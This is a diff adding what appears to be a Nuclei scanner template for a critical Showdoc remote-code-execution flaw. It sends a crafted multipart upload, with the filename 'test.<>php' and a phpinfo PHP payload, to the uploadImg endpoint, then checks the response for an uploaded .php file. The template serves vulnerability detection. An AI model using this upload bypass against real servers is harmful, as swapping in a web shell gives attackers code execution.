@@ -1,0 +1,41 @@
+id: showdoc-rce
+
+info:
+  name: Showdoc RCE
+  author: pikpikcu
+  severity: critical
+  reference: |
+    - https://github.com/star7th/showdoc/pull/1059
+    - https://twitter.com/sec715/status/1384772599641624576
+  tags: showdoc,rce
+
+requests:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+        Content-Length: 239
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+        Accept-Encoding: gzip
+
+        ----------------------------835846770881083140190633
+        Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        Content-Type: text/plain
+
+        <?php phpinfo();?>
+        ----------------------------835846770881083140190633--
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "success"
+          - '[a-f0-9]+\.php'
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
